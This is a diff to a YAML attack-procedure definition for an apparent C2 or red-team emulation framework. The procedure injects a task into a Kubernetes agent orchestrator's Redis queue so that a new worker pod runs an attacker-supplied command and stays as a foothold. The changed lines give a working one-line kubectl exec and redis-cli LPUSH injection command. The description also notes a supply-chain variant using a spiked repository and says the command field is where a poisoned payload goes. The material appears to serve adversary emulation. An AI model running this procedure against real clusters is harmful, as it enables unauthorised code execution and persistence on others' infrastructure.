@@ -5,12 +5,11 @@ description: >
   orchestrator pops it and creates a fresh agent-worker pod that runs the task's
   command immediately (a heartbeat by default), then stays alive as a foothold.
   Re-run to spawn another worker (bounded by the orchestrator's MAX_WORKERS).
-  Driven from the operator/Ran host: it opens a short-lived kubectl
-  port-forward to the Redis Service, runs redis-cli locally against it, then
-  tears the forward down - no node IP, no NodePort, and nothing required inside
-  the target pod (redis-cli lives on the operator host, as it already does for
-  exploit-redis). The task itself is innocuous; in the supply-chain variant the
-  repo is spiked, so processing it is what pops the worker.
+  Driven from the operator/Ran host via the kubeconfig: it execs redis-cli
+  inside the Redis pod (redis-cli ships in that image - the liveness probe uses
+  it), so no node IP or NodePort is needed. The task itself is innocuous; in the
+  supply-chain variant the repo is spiked, so processing it is what pops the
+  worker.
 tactic: Execution
 techniques: ["User Execution", "T1204"]
 parameters:
@@ -33,15 +32,12 @@ parameters:
       heartbeat by default; this is where a poisoned task would put its payload.
       Avoid embedded double quotes (it is carried inside a JSON string).
 procedures:
-  # One line once Ran flattens it: statements are ;-terminated (no bare-newline
-  # separators) and there are no backslash continuations - both break under
-  # Ran's newline->space flattening.
+  # Kept on one line: Ran flattens newlines to spaces but keeps backslashes, so
+  # a "\" continuation becomes an escaped space and mangles the next arg (that
+  # was the " redis-cli: not found" error).
   - key: kubectl
     command: |
-      kubectl ${K8S_AUTH} -n agent-system port-forward svc/redis 16379:6379 >/dev/null 2>&1 & PF=$! ;
-      trap 'kill $PF 2>/dev/null' EXIT ;
-      for i in $(seq 1 30); do redis-cli -h 127.0.0.1 -p 16379 ping >/dev/null 2>&1 && break; sleep 0.3; done ;
-      redis-cli -h 127.0.0.1 -p 16379 LPUSH queue:pending "{\"id\":\"${TASK_ID}\",\"repo\":\"${REPO}\",\"cmd\":\"${CMD}\"}"
+      kubectl ${K8S_AUTH} -n agent-system exec deploy/redis -- redis-cli LPUSH queue:pending "{\"id\":\"${TASK_ID}\",\"repo\":\"${REPO}\",\"cmd\":\"${CMD}\"}"
     isLocal: true
 preconditions:
   kind: C2
